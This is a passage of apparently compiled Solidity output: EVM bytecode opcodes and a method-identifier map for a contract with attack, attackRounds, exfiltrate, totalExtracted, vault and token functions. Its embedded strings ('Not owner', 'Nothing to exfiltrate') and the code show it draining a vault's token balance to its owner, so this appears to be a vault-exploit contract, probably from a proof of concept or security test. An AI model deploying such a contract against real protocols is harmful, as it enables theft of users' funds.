PUSH2 0x8E2 SWAP2 SWAP1 PUSH2 0xBEC JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x7D882097 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x933 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x957 SWAP2 SWAP1 PUSH2 0xBEC JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x27E235E3 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x27E235E3 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x99F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x9C3 SWAP2 SWAP1 PUSH2 0xBEC JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x54F7D9C PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA14 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xA38 SWAP2 SWAP1 PUSH2 0xC05 JUMP JUMPDEST SWAP4 POP SWAP4 POP SWAP4 POP SWAP4 POP SWAP1 SWAP2 SWAP3 SWAP4 JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xA8C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x9 PUSH1 0x24 DUP3 ADD MSTORE PUSH9 0x2737BA1037BBB732B9 PUSH1 0xB9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x1B4 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xAD5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xAF9 SWAP2 SWAP1 PUSH2 0xBEC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 GT PUSH2 0xB43 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x4E6F7468696E6720746F20657866696C7472617465 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x1B4 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP5 SWAP1 MSTORE SWAP2 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB98 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xBBC SWAP2 SWAP1 PUSH2 0xC05 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xBD5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP DUP2 CALLDATALOAD SWAP4 PUSH1 0x20 DUP4 ADD CALLDATALOAD SWAP4 POP PUSH1 0x40 SWAP1 SWAP3 ADD CALLDATALOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xBFE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xC17 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0xC27 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 RETURNDATASIZE GT ISZERO PUSH2 0xC47 JUMPI PUSH1 0x4 PUSH1 0x0 DUP1 RETURNDATACOPY POP PUSH1 0x0 MLOAD PUSH1 0xE0 SHR JUMPDEST SWAP1 JUMP JUMPDEST PUSH1 0x1F DUP3 ADD PUSH1 0x1F NOT AND DUP2 ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP3 DUP3 LT OR ISZERO PUSH2 0xC7E JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x40 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x44 RETURNDATASIZE LT ISZERO PUSH2 0xC93 JUMPI SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x3 NOT RETURNDATASIZE DUP2 ADD PUSH1 0x4 DUP4 RETURNDATACOPY DUP2 MLOAD RETURNDATASIZE PUSH8 0xFFFFFFFFFFFFFFFF DUP2 PUSH1 0x24 DUP5 ADD GT DUP2 DUP5 GT OR ISZERO PUSH2 0xCC3 JUMPI POP POP POP POP POP SWAP1 JUMP JUMPDEST DUP3 DUP6 ADD SWAP2 POP DUP2 MLOAD DUP2 DUP2 GT ISZERO PUSH2 0xCDB JUMPI POP POP POP POP POP POP SWAP1 JUMP JUMPDEST DUP5 RETURNDATASIZE DUP8 ADD ADD PUSH1 0x20 DUP3 DUP6 ADD ADD GT ISZERO PUSH2 0xCF5 JUMPI POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH2 0xD04 PUSH1 0x20 DUP3 DUP7 ADD ADD DUP8 PUSH2 0xC4A JUMP JUMPDEST POP SWAP1 SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST DUP3 DUP2 MSTORE PUSH1 0x0 PUSH1 0x20 PUSH1 0x40 PUSH1 0x20 DUP5 ADD MSTORE DUP4 MLOAD DUP1 PUSH1 0x40 DUP6 ADD MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0xD44 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x60 ADD MSTORE DUP3 ADD PUSH2 0xD28 JUMP JUMPDEST POP PUSH1 0x0 PUSH1 0x60 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x60 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 0xD8F JUMPI PUSH2 0xD8F PUSH2 0xD66 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0xDA7 JUMPI PUSH2 0xDA7 PUSH2 0xD66 JUMP JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP INVALID 0xC9 0xB6 SUB 0x29 0xCD CREATE SWAP1 TIMESTAMP CALL CALLVALUE 0xB6 MSTORE LOG0 DUP7 SMOD GAS 0xBF BASEFEE RETURNDATACOPY SIGNEXTEND 0xEE TIMESTAMP MULMOD 0xBF DUP13 LT 0x4F JUMPI PUSH8 0x4FFBC6A264697066 PUSH20 0x5822122014355EB50495EF1A3FD2F57B8D55D150 0xBB PC 0xCA TIMESTAMP 0xE5 BASEFEE 0xA5 0xAA PUSH21 0xEDC3B1B92337BE64736F6C63430008180033000000 "},"methodIdentifiers":{"attack(uint256,uint256,uint256)":"407f85f8","attackRounds()":"76be27f5","attackRunning()":"f81b78b6","exfiltrate()":"94c73340","getStatus()":"4e69d560","owner()":"8da5cb5b","token()":"fc0c546a","totalExtracted()":"09d0cb56","vault()":"fbfa77cf"}}}}}